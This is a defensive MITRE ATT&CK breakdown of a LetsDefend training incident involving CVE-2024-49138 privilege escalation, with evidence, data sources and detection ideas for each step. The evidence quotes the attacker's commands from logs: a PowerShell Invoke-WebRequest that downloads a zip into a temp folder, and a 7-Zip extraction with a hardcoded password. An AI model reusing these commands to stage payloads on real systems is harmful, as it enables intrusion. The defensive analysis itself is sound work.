# Technique Breakdown — SOC335

Full per-technique mapping for the SOC335 (CVE-2024-49138 privilege escalation) incident, investigated and closed on [LetsDefend](https://letsdefend.io/) as part of [project 1](https://github.com/zaimmzulhazziq/soc-log-analysis-siem). Raw evidence referenced below matches the input data used in [project 2](https://github.com/zaimmzulhazziq/ai-assisted-incident-triage/blob/main/examples/SOC335/input-alert-data.md).

---

## 1. Brute Force — Password Guessing
**Tactic:** Credential Access
**Technique:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) — Brute Force: Password Guessing

**Evidence:** `EventID 4625 (Failed Logon) ×14 — Source IP 185.107.56.141 — Target accounts: admin, guest — Logon Type 3` (Log Management, Authentication logs)

**Why this sub-technique and not another:** ATT&CK splits Brute Force into four sub-techniques. Password Spraying (T1110.003) is one password against many accounts; this is the reverse — 14 attempts concentrated on two known/default account names (`admin`, `guest`). That pattern — repeated guesses against a small, predictable set of accounts — is Password Guessing (T1110.001), not spraying.

**Data source:** Windows Security Event Log (Logon events), collected via Log Management. This is the standard place brute force shows up — any SOC building a detection rule for this technique should start here.

**Detection idea:** Alert on ≥N EventID 4625 for the same source IP within a short window, especially against non-existent or default account names — this incident's 14 attempts is well past any reasonable threshold.

---

## 2. Successful Remote Logon
**Tactic:** Initial Access
**Technique:** [T1133](https://attack.mitre.org/techniques/T1133/) — External Remote Services

**Evidence:** `EventID 4624 (Successful Logon) — Source IP 185.107.56.141 — Target account: Victor — Logon Type 10 (RemoteInteractive)`

**Honesty note — this one is a judgment call, not a clean fact:** The successful logon was to account `Victor`, not `admin` or `guest` (the accounts that were brute-forced). The evidence available doesn't show *how* the attacker obtained valid credentials for `Victor` — whether that account was also brute-forced (just not captured in the same log excerpt), or the credentials were obtained some other way (phishing, credential reuse, a prior breach). I'm mapping this step to T1133 (External Remote Services) because the concrete, evidenced fact is that RDP — an externally-reachable remote access service — was the entry vector. [T1078](https://attack.mitre.org/techniques/T1078/) (Valid Accounts) would also be defensible if the credentials were confirmed stolen rather than guessed, but the evidence doesn't settle that. A mapping that picked one of these and presented it as certain would be overclaiming; noting the ambiguity is the more accurate answer.

**Data source:** Windows Security Event Log (Logon events).

**Detection idea:** Flag RDP logons (Logon Type 10) from external IPs immediately following a burst of failed logons from the same source — the temporal link between the two is stronger detection signal than either event alone.

---

## 3. Discovery Commands
**Tactic:** Discovery
**Technique:** [T1033](https://attack.mitre.org/techniques/T1033/) — System Owner/User Discovery

**Evidence:** `whoami` / `whoami /priv` (Endpoint Security → Terminal History)

**Why this technique:** `whoami` identifies the current user context — the textbook case for T1033. `whoami /priv` extends this to enumerate the account's token privileges, which is really reconnaissance for the next step (does this account already have, or can it be escalated to, the rights needed to run the payload). ATT&CK doesn't have a dedicated sub-technique purely for privilege enumeration via `whoami /priv`; T1033 is the closest accurate parent technique for both commands as used here.

**Data source:** Endpoint process/command-line logging (Terminal History on LetsDefend). **This is the same data source that held the critical evidence for step 5 below** — worth flagging because project 1's biggest lesson was that this data source is easy to skip if you're used to starting investigations from network logs.

**Detection idea:** `whoami /priv` specifically (rather than plain `whoami`) is a meaningfully rarer, more suspicious command in most environments — worth a lower-noise detection rule than alerting on `whoami` alone.

---

## 4. PowerShell Execution
**Tactic:** Execution
**Technique:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/) — Command and Scripting Interpreter: PowerShell

**Evidence:** `powershell -c "Invoke-WebRequest -Uri https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip -OutFile C:\temp\service-installer.zip"` (Terminal History)

**Why this technique:** The attacker used PowerShell as the execution engine to run the download command — this is the direct, textbook case for T1059.001.

**Data source:** Terminal History (command-line/process logging).

**Detection idea:** `Invoke-WebRequest` (or its `iwr`/`curl`/`wget` PowerShell aliases) downloading to a user-writable temp directory is a high-value detection pattern, especially combined with an external, non-corporate URL like a raw S3 bucket.

---

## 5. Ingress Tool Transfer
**Tactic:** Command and Control
**Technique:** [T1105](https://attack.mitre.org/techniques/T1105/) — Ingress Tool Transfer

**Evidence:** Same command as step 4 — `Invoke-WebRequest -Uri https://files-ld.s3.us-east-2.amazonaws.com/service-installer.zip` (Terminal History)

**Why this is a separate row from step 4:** T1059.001 and T1105 describe the *same command* from two different angles — the tool used to execute it (PowerShell) versus the action it performs (transferring a file onto the host from outside). ATT&CK expects both to be recorded; conflating them into one row would undercount the technique coverage of a single action.

**Critical operational note:** this activity does **not** appear in the Network Action / outbound-connection log — it's only visible in Terminal History. This was the single biggest miss in the original investigation (see project 1's Lessons Learnt): checking network logs alone for C2/download activity would have missed this step entirely.

**Data source:** Terminal History. (Notably *not* network flow logs, in this case — see above.)

**Detection idea:** Correlate PowerShell process creation with subsequent outbound HTTP(S) connections at the EDR/process level, since perimeter network logging alone proved insufficient here.

---

## 6. Archive Password Protection
**Tactic:** Defense Evasion
**Technique:** [T1027.013](https://attack.mitre.org/techniques/T1027/013/) — Obfuscated Files or Information: Encrypted/Encoded File

**Evidence:** `7z x C:\temp\service-installer.zip -pP@ssw0rd123 -oC:\temp\service_installer` (Terminal History)

**Why this technique:** A password-protected archive can't be inspected by content-scanning security tools (AV, email/web gateways, sandboxes) without the password — that's precisely what T1027.013 covers: using encryption/encoding to hide file contents from detection until execution.

**Data source:** Terminal History (the extraction command and hardcoded password are both visible here — the password itself being embedded in plaintext in the command is worth noting as an OPSEC weakness on the attacker's part).

**Detection idea:** Alert on password-protected archive extraction via command-line tools (7-Zip, WinRAR) run from a script or non-interactive context, especially in temp directories.

---

## 7. Masquerading
**Tactic:** Defense Evasion
**Technique:** [T1036.005](https://attack.mitre.org/techniques/T1036/005/) — Masquerading: Match Legitimate Name or Location

**Evidence:** `Process: svohost.exe — Path: C:\temp\service_installer\svohost.exe` (Endpoint Security → Processes)

**Why this sub-technique:** `svohost.exe` is a near-exact visual match for the legitimate Windows process `svchost.exe` (two letters swapped) — a deliberate attempt to blend into a process list at a glance. That's precisely what T1036.005 covers: naming a malicious file to resemble a legitimate, expected one. (A secondary red flag project 1 also noted: the real `svchost.exe` runs from `C:\Windows\System32\`, never from a user temp directory — the path alone would have been a tell even before the name similarity.)

**Data source:** Endpoint process logging.

**Detection idea:** Flag process names that are a small edit-distance from well-known system binary names (`svchost.exe`, `lsass.exe`, `explorer.exe`, etc.) but running from a non-standard path.

---

## 8. Privilege Escalation via Exploit
**Tactic:** Privilege Escalation
**Technique:** [T1068](https://attack.mitre.org/techniques/T1068/) — Exploitation for Privilege Escalation

**Evidence:** `Device Action: Allowed` on the `svohost.exe` process, correlated with the alert's own classification (CVE-2024-49138, a Windows kernel-mode-driver privilege escalation vulnerability) (Endpoint Security → Processes; alert metadata)

**Why this technique:** The payload's entire purpose, per the alert classification and the exploited CVE, is escalating privileges by exploiting a software vulnerability rather than through a misconfiguration or stolen higher-privileged credentials — the direct definition of T1068.

**Critical operational note:** `Device Action: Allowed` means the endpoint agent did **not** block this execution, despite the file being confirmed malicious by 50/71 VirusTotal vendors. This is the second major finding from project 1 (the original playbook answer of "Quarantined" was wrong) — and it's the same fact that the AI-drafted report in [project 2](https://github.com/zaimmzulhazziq/ai-assisted-incident-triage) also got wrong by assuming containment without checking this field.

**Data source:** Endpoint process logging (the explicit action-taken field).

**Detection idea/mitigation:** This finding is really a control-effectiveness gap, not a detection gap — the file was already known-malicious and still ran. The concrete recommendation is auditing why the endpoint agent's policy allowed execution of a file with that verdict, not just adding a new detection rule.

---

## Summary: tactics touched
Credential Access → Initial Access → Discovery → Execution → Command and Control → Defense Evasion (×2) → Privilege Escalation. Six of the fourteen Enterprise ATT&CK tactics, in a single incident — a reasonable illustration of why one well-investigated incident maps to more of the matrix than it might first appear.
